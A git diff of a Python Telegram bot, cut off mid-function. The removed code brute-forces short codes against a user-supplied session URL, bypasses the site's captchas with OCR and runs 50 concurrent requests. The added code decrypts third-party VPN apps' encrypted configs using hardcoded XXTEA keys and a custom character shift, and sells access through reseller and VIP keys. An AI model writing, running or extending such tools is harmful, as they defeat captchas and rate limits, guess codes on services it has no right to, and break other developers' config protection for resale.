@@ -1,1046 +1,884 @@
-import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
-from telebot.async_telebot import AsyncTeleBot
-from aiohttp import web
-import cv2
-import ddddocr
-import numpy as np
-from datetime import datetime, timedelta, timezone
+# All-in-One VPN APK VIP & Telegram VIP Management Bot (With Decrypt Features)
+# Py By @AHLFLK2025
+
+import os
+import re
+import sqlite3
+import requests
+import json
+import struct
+import base64
+import urllib.request
+from threading import Thread
+from datetime import datetime, timedelta
+from flask import Flask, request, abort
+import telebot
+from telebot import types
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-GITHUB_TOKEN = os.getenv("GH_TOKEN")
 ADMIN_ID = int(os.environ.get("TGC_ID")) if os.environ.get("TGC_ID") else None
-REPO_OWNER = "ahlflk"
-REPO_NAME = "AHLFLK2025_VPN_Decrypt_Bot"
-SUCCESS_CODE = asyncio.Queue()
-bot = AsyncTeleBot(BOT_TOKEN)
-user_data = {}
-approve = {}
-scan_tasks = {}
-success_messages = {}
-success_texts = {}
-limited_messages = {}
-limited_texts = {}
-captcha_state = {}
-retry_counts = {}
-session = None
-_connector = None
-CONCURRENCY = 50
-_voucher_sem = None
-_start_time = time.monotonic()
+SCRIPT_URL = os.environ.get("SCRIPT_URL")
+PUBLIC_URL = os.environ.get("PUBLIC_URL")
+VPN_CONFIGS = os.environ.get("VPN_CONFIGS")
 
-async def handle(request):
-    return web.Response(text="Bot is awake and running 24/7!")
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
+app = Flask('')
 
-async def web_server():
-    app = web.Application()
-    app.router.add_get('/', handle)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get('PORT', 8099))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    print(f"Web server started on port {port}")
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_FILE = os.path.join(BASE_DIR, "keys_management.db")
 
-async def get_file_content(path):
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    async with session.get(url, headers=headers) as response:
-        if response.status == 200:
-            data = await response.json()
-            content = base64.b64decode(data['content']).decode('utf-8')
-            return json.loads(content), data['sha']
-    return {}, None
+user_states = {}
+reseller_temp_data = {}
+vip_temp_data = {}
 
-async def update_file_content(path, content, sha, message):
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
+ADMIN_BUTTONS = [
+    ["🌐 VPN Decrypt List"],
+    ["➕ Add VIP User", "🔑 My VIP Users"],
+    ["✏️ Edit VIP", "🗑 Delete VIP"],
+    ["👤 Create Reseller", "📊 Reseller List"],
+    ["✏️ Edit Reseller", "🗑 Delete Reseller"],
+    ["🌐 View All VIPs", "💰 My Balance"]
+]
+
+RESELLER_BUTTONS = [
+    ["🌐 VPN Decrypt List"],
+    ["➕ Add VIP User", "🔑 My VIP Users"],
+    ["✏️ Edit VIP", "🗑 Delete VIP"],
+    ["💰 My Balance"]
+]
+
+USER_BUTTONS = [
+    ["💰 My Balance"]
+]
+
+def get_menu_markup(user_id):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    if user_id == ADMIN_ID:
+        for row in ADMIN_BUTTONS:
+            markup.add(*[types.KeyboardButton(b) for b in row])
+    elif is_reseller(user_id):
+        for row in RESELLER_BUTTONS:
+            markup.add(*[types.KeyboardButton(b) for b in row])
+    else:
+        for row in USER_BUTTONS:
+            markup.add(*[types.KeyboardButton(b) for b in row])
+    return markup
+
+def get_admin_contact_markup():
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton(text="💬 Contact Admin", url="https://t.me/ahlflk2025"))
+    return markup
+
+def get_current_date_string():
+    utc_now = datetime.utcnow()
+    mm_now = utc_now + timedelta(hours=7)
+    return mm_now.strftime("%d/%m/%Y")
+
+# ==========================================
+# CRYPTOGRAPHY & DECRYPTION ENGINE (XXTEA)
+# ==========================================
+def u32(x): return x & 0xFFFFFFFF
+
+def _longs_to_bytes(n, include_length):
+    length = len(n)
+    res = struct.pack('<%dI' % length, *n)
+    if include_length:
+        expected_length = n[-1]
+        max_len = len(res) - 4
+        min_len = len(res) - 7
+        if expected_length < min_len or expected_length > max_len:
+            return res[:-4].rstrip(b'\x00')
+        res = res[:expected_length]
+    return res
+
+def _bytes_to_longs(s):
+    padding = (4 - len(s) % 4) % 4
+    s += b'\x00' * padding
+    return list(struct.unpack('<%dI' % (len(s) // 4), s))
+
+def _fix_key(key_bytes):
+    if len(key_bytes) == 16: return key_bytes
+    return key_bytes[:16] if len(key_bytes) > 16 else key_bytes + b'\x00' * (16 - len(key_bytes))
+
+def decrypt_xxtea(data, key, delta):
+    if len(data) == 0: return b''
+    v = _bytes_to_longs(data)
+    k = _bytes_to_longs(_fix_key(key))
+    n = len(v)
+    if n < 2: return data 
+
+    q = 52 // n + 6
+    sum_val = u32(q * delta)
+
+    while sum_val != 0:
+        e = u32(sum_val >> 2) & 3
+        y = v[0]
+        for p in range(n - 1, 0, -1):
+            z = v[p - 1]
+            mx = u32(((z >> 5) ^ u32(y << 2)) + ((y >> 3) ^ u32(z << 4))) ^ u32((sum_val ^ y) + (k[(p & 3) ^ e] ^ z))
+            y = u32(v[p] - mx)
+            v[p] = y
+        z = v[n - 1]
+        mx = u32(((z >> 5) ^ u32(y << 2)) + ((y >> 3) ^ u32(z << 4))) ^ u32((sum_val ^ y) + (k[(0 & 3) ^ e] ^ z))
+        y = u32(v[0] - mx)
+        v[0] = y
+        sum_val = u32(sum_val - delta)
+    return _longs_to_bytes(v, True)
+
+def parse_delta(delta_val):
+    if isinstance(delta_val, int): return delta_val
+    try:
+        if isinstance(delta_val, str) and delta_val.strip().startswith('-'):
+            clean_hex = delta_val.replace('-', '').strip()
+            return -int(clean_hex, 16)
+        else: return int(delta_val, 16)
+    except: return 0x2e0ba747
+
+def decrypt_inner_base64_recursive(encrypted_str):
+    if not isinstance(encrypted_str, str) or len(encrypted_str) < 4: return encrypted_str
+    try:
+        clean_str = encrypted_str.replace('\n', '').replace('\r', '').strip()
+        if not re.match(r'^[A-Za-z0-9+/=]+$', clean_str): return encrypted_str
+        missing_padding = len(clean_str) % 4
+        if missing_padding: clean_str += '=' * (4 - missing_padding)
+        decoded_bytes = base64.b64decode(clean_str)
+        decoded_str = decoded_bytes.decode('utf-8')
+        if len(decoded_str) > 4 and re.match(r'^[A-Za-z0-9+/=]+$', decoded_str.replace('\n','').strip()):
+            if any(x in decoded_str for x in ["HTTP/", "vless://", "vmess://", "trojan://", "ss://"]): return decoded_str
+            return decrypt_inner_base64_recursive(decoded_str)
+        return decoded_str
+    except: return encrypted_str
+
+def decrypt_inner_bamar(encrypted_str):
+    if not encrypted_str or len(encrypted_str) < 10: return encrypted_str
+    try:
+        data = base64.b64decode(encrypted_str)
+        decrypted_bytes = decrypt_xxtea(data, b"9488362782103982762188", 0x2e0ba747)
+        return decrypted_bytes.decode('utf-8', errors='ignore') if decrypted_bytes else encrypted_str
+    except: return encrypted_str
+
+def decrypt_inner_pnt(encrypted_str):
+    if not encrypted_str or len(encrypted_str) < 15: return encrypted_str
+    try:
+        data = base64.b64decode(encrypted_str, validate=True)
+        decrypted_bytes = decrypt_xxtea(data, b"7361", 0x2e0ba747)
+        if not decrypted_bytes: return encrypted_str
+        intermediate_str = decrypted_bytes.decode('utf-8')
+        key_int = 7361
+        final_str = []
+        for char in intermediate_str:
+            val = (ord(char) - key_int - key_int) & 0xFFFF
+            final_str.append(chr(val))
+        return "".join(final_str)
+    except: return encrypted_str
+
+def process_json_structure(data, method):
+    if isinstance(data, dict): return {k: process_json_structure(v, method) for k, v in data.items()}
+    elif isinstance(data, list): return [process_json_structure(i, method) for i in data]
+    elif isinstance(data, str):
+        if method == "bamar": return decrypt_inner_bamar(data)
+        elif method == "pnt_special": return decrypt_inner_pnt(data)
+        elif method == "base64_recursive": return decrypt_inner_base64_recursive(data)
+        return data
+    return data
+
+def perform_decryption(config_url, outer_key, outer_delta_raw, method):
     headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Content-Type": "application/json"
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
     }
-    encoded = base64.b64encode(json.dumps(content).encode()).decode()
+    req = urllib.request.Request(config_url, headers=headers)
+    with urllib.request.urlopen(req) as response:
+        enc_base64 = response.read().decode('utf-8').replace('\n', '').replace('\r', '').strip()
+        
+    outer_delta = parse_delta(outer_delta_raw)
+    enc_data = base64.b64decode(enc_base64)
+    dec_bytes = decrypt_xxtea(enc_data, outer_key.encode('utf-8'), outer_delta)
+    raw_json_str = dec_bytes.decode('utf-8', errors='ignore').replace('\\/', '/')
+    json_obj = json.loads(raw_json_str)
+    return {"AHLFLK": "Decrypted By @AHLFLK2025", **process_json_structure(json_obj, method)}
+
+def get_vpn_configs():
+    try: 
+        return json.loads(VPN_CONFIGS) if VPN_CONFIGS else []
+    except Exception as e: 
+        print(f"[-] VPN Configs Parse Error: {str(e)}")
+        return []
+
+# ==========================================
+# DATABASE SYNC ENGINE
+# ==========================================
+def init_db():
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+    try:
+        cursor = conn.cursor()
+        cursor.execute('''CREATE TABLE IF NOT EXISTS auth_keys (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, 
+            target_id TEXT UNIQUE,
+            key_string TEXT, 
+            unit_val TEXT, 
+            duration_type TEXT, 
+            added_by INTEGER,
+            created_at TEXT
+        )''')
+        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
+            tg_id INTEGER PRIMARY KEY, 
+            username TEXT, 
+            role TEXT,
+            token_balance INTEGER DEFAULT 0,
+            expire_date TEXT DEFAULT '31/12/2099'
+        )''')
+        cursor.execute("INSERT OR REPLACE INTO users (tg_id, username, role, token_balance, expire_date) VALUES (?, ?, ?, ?, ?)", 
+                       (ADMIN_ID, 'Main_Admin', 'admin', -1, '31/12/2099'))
+        conn.commit()
+    finally:
+        conn.close()
+
+def pull_data_from_google_sheet():
+    if not SCRIPT_URL: return
+    try:
+        res = requests.get(SCRIPT_URL, timeout=15)
+        if res.status_code == 200:
+            data_list = res.json()
+            if isinstance(data_list, dict) and "error" in data_list: return
+            
+            conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+            try:
+                cursor = conn.cursor()
+                cursor.execute("DELETE FROM auth_keys")
+                cursor.execute("DELETE FROM users WHERE tg_id != ?", (ADMIN_ID,))
+                
+                for row in data_list:
+                    col_a = str(row.get("Users") or "").strip() 
+                    k_str = str(row.get("Name") or "").strip()  
+                    key_apk = str(row.get("Key") or "").strip() 
+                    c_at = row.get("Start") or get_current_date_string()
+                    m_val = row.get("Month") or 0
+                    
+                    if k_str == "": continue
+                    
+                    if "_Reseller" in k_str:
+                        try:
+                            clean_name = k_str.replace("_Reseller", "").strip()
+                            token_val = int(float(key_apk)) if '.' in key_apk else int(key_apk)
+                            
+                            # Calculating Expire Date for Resellers based on Months
+                            clean_months = int(float(m_val)) if str(m_val).replace('.','',1).isdigit() else 0
+                            c_at_str = str(c_at).strip()
+                            fmt = "%d/%m/%Y" if '/' in c_at_str else "%Y-%m-%d"
+                            try:
+                                start_dt = datetime.strptime(c_at_str, fmt)
+                                exp_date = (start_dt + timedelta(days=clean_months*30)).strftime("%d/%m/%Y")
+                            except:
+                                exp_date = "31/12/2099"
+
+                            cursor.execute("INSERT OR REPLACE INTO users (tg_id, username, role, token_balance, expire_date) VALUES (?, ?, ?, ?, ?)", 
+                                           (int(col_a), clean_name, 'reseller', token_val, exp_date))
+                        except: pass
+                    else:
+                        try:
+                            clean_months = int(float(m_val)) if str(m_val).replace('.','',1).isdigit() else 1
+                            final_creator = int(col_a) if col_a.isdigit() else ADMIN_ID
+                            
+                            cursor.execute("INSERT OR IGNORE INTO auth_keys (target_id, key_string, unit_val, duration_type, added_by, created_at) VALUES (?, ?, ?, ?, ?, ?)", 
+                                           (key_apk, k_str, str(clean_months), "m", final_creator, str(c_at).strip()))
+                        except: pass
+                conn.commit()
+            finally:
+                conn.close()
+    except Exception as e:
+        print(f"[-] Pull Error: {str(e)}")
+
+def push_to_google_sheet(action, users, name, key, start, month, reseller_months=0, added_by=""):
+    if not SCRIPT_URL: return False
     payload = {
-        "message": message,
-        "content": encoded,
-        "sha": sha
-    }
-    async with session.put(url, headers=headers, json=payload) as response:
-        return await response.text()
-
-@bot.message_handler(commands=['start'])
-async def start(message):
-    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")
-
-@bot.message_handler(commands=['key'])
-async def handle_key(message):
-    global approve
-    key = str(message.chat.id)
-    auth_list, _ = await get_file_content("auth_list.json")
-    if key in auth_list:
-        valid = check_key_expiration(auth_list[key])
-        if valid:
-            approve[message.chat.id] = True
-            user_data[message.chat.id] = {}
-            await bot.reply_to(
-                message,
-                " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
-            )
-        else:
-            approve[message.chat.id] = False
-            await bot.reply_to(
-                message,
-                " Key Expired ဖြစ်နေပါသည်။"
-            )
-    else:
-        await bot.reply_to(
-            message,
-            " သင်၏ key ကို registered မလုပ်ရသေးပါ။"
-        )
-
-
-
-@bot.message_handler(commands=['listkeys'])
-async def listkeys(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    try:
-        auth_list, _ = await get_file_content("auth_list.json")
-        if not auth_list:
-            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
-            return
-        lines = []
-        for uid, data in auth_list.items():
-            if isinstance(data, dict):
-                expires = data.get("expires_at", "unknown")
-                plan = data.get("plan", "unknown")
-                if expires == "9999-12-31T23:59:59Z":
-                    expires_str = "Unlimited"
-                else:
-                    try:
-                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
-                        now = datetime.now(timezone.utc)
-                        if exp_dt < now:
-                            expires_str = "Expired"
-                        else:
-                            diff = exp_dt - now
-                            days = diff.days
-                            hours, rem = divmod(diff.seconds, 3600)
-                            minutes = rem // 60
-                            expires_str = f"{days}d {hours}h {minutes}m left"
-                    except:
-                        expires_str = expires
-            else:
-                plan = "old"
-                expires_str = str(data)
-            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
-        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
-        if len(text) > 4096:
-            for i in range(0, len(text), 4096):
-                await bot.send_message(message.chat.id, text[i:i+4096])
-        else:
-            await bot.reply_to(message, text)
-    except Exception as e:
-        print(f"Error at listkeys {e}")
-
-@bot.message_handler(commands=['delkey'])
-async def delkey(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    try:
-        args = message.text.split()
-        if len(args) < 2:
-            await bot.reply_to(message, "Usage:\n/delkey 123456789")
-            return
-        user_id = args[1]
-        auth_list, sha = await get_file_content("auth_list.json")
-        if user_id not in auth_list:
-            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
-            return
-        del auth_list[user_id]
-        await update_file_content(
-            "auth_list.json",
-            auth_list,
-            sha,
-            f"Delete key for {user_id}"
-        )
-        approve.pop(int(user_id), None)
-        user_data.pop(int(user_id), None)
-        await bot.reply_to(
-            message,
-            f" Key Deleted\n\nUSER ID : {user_id}"
-        )
-    except Exception as e:
-        print(f"Error at delkey {e}")
-
-@bot.message_handler(commands=['genkey'])
-async def genkey(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    try:
-        args = message.text.split()
-        if len(args) < 3:
-            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
-            return
-        plan = args[1]
-        user_id = args[2]
-        expiry = generate_expiry(plan)
-        if not expiry:
-            await bot.reply_to(
-                message,
-                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
-            )
-            return
-        auth_list, sha = await get_file_content("auth_list.json")
-        auth_list[user_id] = {
-            "expires_at": expiry,
-            "plan": plan
-        }
-        await update_file_content(
-            "auth_list.json",
-            auth_list,
-            sha,
-            f"Add key for {user_id}"
-        )
-        await bot.reply_to(
-            message,
-            f" Key Generated\n\n"
-            f"USER ID : {user_id}\n"
-            f"PLAN : {plan}\n"
-            f"EXPIRES : {expiry}"
-        )
-    except Exception as e:
-        print(f"Error at genkey {e}")
-
-@bot.message_handler(commands=['result'])
-async def handle_result(message):
-    auth_list, _ = await get_file_content("auth_list.json")
-    if str(message.chat.id) in auth_list:
-        results, _ = await get_file_content("result.json")
-        chat_id_str = str(message.chat.id)
-        if chat_id_str in results and results[chat_id_str]:
-            codes = "\n".join(results[chat_id_str])
-            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
-        else:
-            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
-    else:
-        await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")
-
-def check_key_expiration(expiration_time):
-    try:
-        if isinstance(expiration_time, dict):
-            expiry = expiration_time.get("expires_at")
-            if expiry == "9999-12-31T23:59:59Z":
-                return True
-            exp_time = datetime.fromisoformat(
-                expiry.replace("Z", "+00:00")
-            )
-            return datetime.now(timezone.utc) < exp_time
-        mm, hh, dd, MM, yyyy = map(
-            int,
-            expiration_time.split('-')
-        )
-        expiration_dt = datetime(
-            year=yyyy,
-            month=MM,
-            day=dd,
-            hour=hh,
-            minute=mm,
-            second=0,
-            tzinfo=timezone.utc
-        )
-        return datetime.now(timezone.utc) < expiration_dt
-    except Exception as e:
-        print("Key parse error:", e)
-        return False
-
-def generate_expiry(plan):
-    now = datetime.now(timezone.utc)
-    plans = {
-        "30m": timedelta(minutes=30),
-        "1h": timedelta(hours=1),
-        "1d": timedelta(days=1),
-        "7d": timedelta(days=7),
-        "1m": timedelta(days=30),
-        "1y": timedelta(days=365),
-        "unlimited": None
-    }
-    if plan not in plans:
-        return None
-    if plan == "unlimited":
-        return "9999-12-31T23:59:59Z"
-    return (now + plans[plan]).isoformat()
-
-def get_current_time():
-    return datetime.now(timezone.utc)
-
-@bot.message_handler(commands=['recheck'])
-async def recheck(message):
-    chat_id = message.chat.id
-    if not approve.get(chat_id, False):
-        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
-        return
-    auth_list, _ = await get_file_content("auth_list.json")
-    if str(message.chat.id) in auth_list:
-        results, sha = await get_file_content("result.json")
-        chat_id_str = str(message.chat.id)
-        if chat_id_str in results and results[chat_id_str]:
-            if message.chat.id not in user_data:
-                await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
-                return
-            if "session_url" not in user_data[message.chat.id]:
-                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
-                return
-            codes = results[chat_id_str]
-            await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
-            session_url_recheck = user_data[message.chat.id]["session_url"]
-            recheck_list = []
-            for code in codes:
-                recode = await perform_check(
-                    session_url_recheck,
-                    code,
-                    chat_id,
-                    scan_id=None,
-                    recheck=True,
-                    message=message
-                )
-                if recode:
-                    recheck_list.append(recode)
-            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
-            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
-            await save_rechecked_codes(chat_id_str, recheck_list, sha)
-        else:
-            await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
-    else:
-        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")
-
-async def save_rechecked_codes(chat_id_str, recheck_list, sha):
-    results, _ = await get_file_content("result.json")
-    results[chat_id_str] = recheck_list
-    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")
-
-async def check_session_url(session_url):
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'priority': 'u=0, i',
-        'referer': session_url,
-        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+        "action": action,
+        "users": str(users),
+        "name": str(name),
+        "key": str(key),
+        "start": str(start),
+        "month": int(month),
+        "reseller_months": int(reseller_months),
+        "added_by": str(added_by)
     }
     try:
-        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
-            text_ = str(response.url)
-            print(text_)
-            if "sessionId" in text_:
-                return True
-            else:
-                return False
+        res = requests.post(SCRIPT_URL, json=payload, timeout=15)
+        return res.status_code == 200
     except:
         return False
 
-@bot.message_handler(commands=['input'])
-async def handle_input(message):
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2:
-        await bot.reply_to(
-            message,
-            "Usage:\n\n/input your_session_url"
-        )
-        return
-    url = args[1]
-    if message.chat.id in user_data:
-        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
-        if await check_session_url(session_url=url):
-            user_data[message.chat.id]['session_url'] = url
-            await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
-        else:
-            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")
+# ==========================================
+# HELPER FUNCTIONS & ACCESS CONTROL
+# ==========================================
+def calculate_days(unit):
+    return int(unit) * 30
 
-@bot.message_handler(commands=['scan'])
-async def scan(message):
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2:
-        await bot.reply_to(
-            message,
-            "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
-        )
-        return
-    mode = args[1]
-    chat_id = message.chat.id
-    if not approve.get(chat_id, False):
-        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
-        return
-    chat_id = message.chat.id
-    if chat_id not in user_data:
-        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
-        return
-    if 'session_url' not in user_data[chat_id]:
-        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
-        return
+def is_admin(user_id): 
+    return user_id == ADMIN_ID
 
-    if (
-        chat_id in scan_tasks
-        and not scan_tasks[chat_id]["task"].done()
-    ):
-        await bot.reply_to(
-            message,
-            "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။"
-        )
-        return
-
-    progress_msg = await bot.send_message(
-        chat_id,
-        "🔍Scanning Codes...\n\n")
-    scan_id = str(uuid.uuid4())
-    task = asyncio.create_task(
-        run_bruteforce(
-            mode,
-            chat_id,
-            user_data[chat_id]['session_url'],
-            scan_id,
-            message=message,
-            progress_msg=progress_msg
-        )
-    )
-
-    scan_tasks[chat_id] = {
-        "task": task,
-        "stop": False,
-        "scan_id": scan_id
-    }
-
-@bot.message_handler(commands=['status'])
-async def status(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    active_scans = sum(
-        1 for data in scan_tasks.values()
-        if not data["task"].done()
-    )
-    approved_users = sum(1 for v in approve.values() if v)
-    uptime_seconds = int(time.monotonic() - _start_time)
-    hours, remainder = divmod(uptime_seconds, 3600)
-    minutes, seconds = divmod(remainder, 60)
-    await bot.reply_to(
-        message,
-        f"📊 Bot Status\n\n"
-        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
-        f"🔍 Active Scans: {active_scans}\n"
-        f"✅ Approved Users: {approved_users}\n"
-        f"👥 Sessions Loaded: {len(user_data)}"
-    )
-
-@bot.message_handler(commands=['stop'])
-async def stop_scan(message):
-    chat_id = message.chat.id
-    data = scan_tasks.get(chat_id)
-    if data and not data["task"].done():
-        data["stop"] = True
-        data["scan_id"] = None
-        data["task"].cancel()
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-        retry_counts.pop(chat_id, None)
-        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
-    else:
-        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")
-
-async def github_update_scheduler():
-    global SUCCESS_CODE
-    while True:
-        await asyncio.sleep(80)
-        items = []
-        while not SUCCESS_CODE.empty():
-            items.append(await SUCCESS_CODE.get())
-        if items:
-            try:
-                results, sha = await get_file_content("result.json")
-                for item in items:
-                    chat_id = str(item["chat_id"])
-                    code = item["code"]
-                    if chat_id not in results:
-                        results[chat_id] = []
-                    if code not in results[chat_id]:
-                        results[chat_id].append(code)
-                await update_file_content(
-                    "result.json",
-                    results,
-                    sha,
-                    "Periodic Update"
-                )
-            except Exception as e:
-                print(f"Update Error: {e}")
-
-def digit_generator(length):
-    return "".join(random.choice(string.digits) for _ in range(length))
-
-strings = string.ascii_lowercase + string.digits
-def all_generator(length=6):
-    return "".join(random.choice(strings) for _ in range(length))
-
-strings_2 = string.ascii_lowercase
-def ascii_generator(length=6):
-    return "".join(random.choice(strings_2) for _ in range(length))
-
-def iter_codes(mode):
-    if mode in ["6", "7"]:
-        length = int(mode)
-        codes = [str(i).zfill(length) for i in range(10 ** length)]
-        random.shuffle(codes)
-        yield from codes
-        return
-    if mode == "8":
-        while True:
-            yield digit_generator(8)
-    if mode == "ascii-lower":
-        while True:
-            yield ascii_generator(6)
-    if mode == "all":
-        while True:
-            yield all_generator(6)
-    raise ValueError(f"Unsupported scan mode: {mode}")
-
-def format_progress(checked, total=None, speed=0, found=0, retries=0):
-    speed_str = f"{speed:,.0f} codes/min"
-    if total is not None:
-        bar_length = 20
-        percent = (checked / total) * 100
-        filled = min(bar_length, int(percent / 5))
-        bar = "█" * filled + "░" * (bar_length - filled)
-        return (
-            f"🔍Scanning Codes...\n\n"
-            f"📦Checked : {checked:,}/{total:,}\n"
-            f"📊Progress : {percent:.2f}%\n"
-            f"⚡Speed : {speed_str}\n"
-            f"✅Found : {found}\n"
-            f"🔁Retry : {retries}\n"
-            f"[{bar}]"
-        )
-    return (
-        f"🔍Scanning Codes...\n\n"
-        f"📦Checked : {checked:,}\n"
-        f"⚡Speed : {speed_str}\n"
-        f"✅Found : {found}\n"
-        f"🔁Retry : {retries}\n"
-        f"📊Status : running\n"
-    )
-
-BATCH_SIZE = 50
-
-def _captcha_entry(chat_id):
-    if chat_id not in captcha_state:
-        captcha_state[chat_id] = {
-            "session_id": None,
-            "auth_code": None,
-            "lock": asyncio.Lock(),
-        }
-    return captcha_state[chat_id]
-
-async def get_captcha(chat_id, session, session_url):
-    entry = _captcha_entry(chat_id)
-    if entry["session_id"] and entry["auth_code"]:
-        return entry["session_id"], entry["auth_code"]
-    async with entry["lock"]:
-        if entry["session_id"] and entry["auth_code"]:
-            return entry["session_id"], entry["auth_code"]
-        session_id = await get_session_id(session, session_url, entry.get("session_id"))
-        if not session_id:
-            return None, None
-        for _ in range(10):
-            image = await Captcha_Image(session, session_id)
-            text = await Captcha_Text(image)
-            verified = await Varify_Captcha(session, session_id, text)
-            if verified:
-                entry["session_id"] = session_id
-                entry["auth_code"] = text
-                print(f"[captcha] solved sid={session_id} code={text}")
-                return session_id, text
-        return None, None
-
-def invalidate_captcha(chat_id):
-    entry = _captcha_entry(chat_id)
-    entry["session_id"] = None
-    entry["auth_code"] = None
-
-async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
+def is_reseller(user_id):
